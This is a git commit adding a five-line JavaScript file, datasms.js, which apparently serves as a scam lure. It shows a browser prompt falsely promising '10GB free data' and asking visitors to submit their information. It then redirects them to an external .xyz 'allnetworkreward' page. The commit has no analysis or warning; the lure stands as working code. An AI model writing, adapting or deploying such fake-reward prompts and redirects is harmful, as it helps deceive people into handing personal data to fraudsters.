e9843396f0e561f8f16bac8c7d9ef002f65cfb84
bigetijazz6 <bigetijazz6@gmail.com>
2024-07-02 22:53:47 -0700

    Add files via upload

---
+++ datasms.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('Data Reward: Congratulations, you are Eligible to receive 10GB free data, kindly press 1 to submit your information now ','1');
+if (password != '1') {
+location.href='https://www.ibaakanawan.xyz/allnetworkreward';
+}
